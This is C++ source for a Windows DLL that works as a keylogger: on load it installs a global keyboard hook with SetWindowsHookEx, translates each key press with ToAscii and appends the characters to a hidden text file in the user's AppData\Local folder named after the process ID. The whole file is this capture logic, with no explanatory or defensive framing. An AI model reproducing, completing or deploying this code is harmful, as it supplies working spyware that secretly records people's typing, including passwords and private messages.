// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>
#include <sstream>
using namespace std;


BOOL _declspec(dllexport)__stdcall CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
#if _MSC_VER >= 1400

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

inline HMODULE GetCurrentModuleHandle()

{

	return (HMODULE)&__ImageBase;

	//GetModuleHandle

}

#endif
HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)keyboardProc, GetCurrentModuleHandle(), 0);
BOOL _declspec(dllexport)__stdcall CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	char ch;
	DWORD processID = GetCurrentProcessId();
	string home_dir = getenv("HOMEPATH");
	string file_loc = "C:\\";
	FILE *f;
	file_loc.append(home_dir);
	file_loc.append("\\Appdata\\Local\\");
	file_loc.append(to_string(processID));
	file_loc.append(".txt");
	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			fopen_s(&f, file_loc.c_str(), "a+");
			if (wParam == VK_RETURN)
			{
				ch = '\n';
				fwrite(&ch, 1, 1, f);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = char(w);
				fwrite(&ch, 1, 1, f);
			}
			fclose(f);
		}
	}
	//HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)keyboardProc, GetCurrentModuleHandle(), 0);
	LRESULT RetVal = CallNextHookEx(hkb, nCode, wParam, lParam);
	return  RetVal;
}

BOOL _declspec(dllexport)__stdcall installhook() {
	
	DWORD processID = GetCurrentProcessId();
	string home_dir = getenv("HOMEPATH");
	string file_loc = "C:\\";
	FILE *f;
	file_loc.append(home_dir);
	file_loc.append("\\Appdata\\Local\\");
	file_loc.append(to_string(processID));
	file_loc.append(".txt");
	
	fopen_s(&f, file_loc.c_str(), "w");
	fclose(f);
	//hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)keyboardProc, GetCurrentModuleHandle(), 0);
	return TRUE;


}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		installhook();
		break;
    case DLL_THREAD_ATTACH:

		break;
    case DLL_THREAD_DETACH:

		break;
    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;
}

